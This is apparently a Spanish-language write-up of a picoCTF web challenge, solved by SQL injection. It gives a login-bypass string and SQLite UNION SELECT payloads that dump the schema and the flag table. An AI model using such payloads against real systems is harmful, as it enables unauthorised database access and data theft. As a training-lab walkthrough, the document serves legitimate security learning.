## Descripción
Can you find the flag on this website. Try to find the flag [here](http://saturn.picoctf.net:65153/).
## Solución (Inyección SQL)
1. Accedemos con una inyección como `' or 1=1;` o `' or 1=1 ---`
![[Pasted image 20250327001517.png | 500]]
2. Obtener la versión de SQL
```sql
' UNION SELECT sqlite_version(),2,3;
```
![[Pasted image 20250327001600.png | 500]]
3. Obtener la estructura de la base de datos
```SQL
' UNION SELECT sql,2,3 FROM sqlite_master;
```
![[Pasted image 20250327000918.png | 500]]
4. Buscar la bandera de la tabla de `more_table`
```SQL
' UNION SELECT id,flag,3 FROM more_table;
```
![[Pasted image 20250327001341.png | 500]]
## Notas adicionales
## Referencias
https://www.youtube.com/watch?v=qLeeLRn9Z78
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md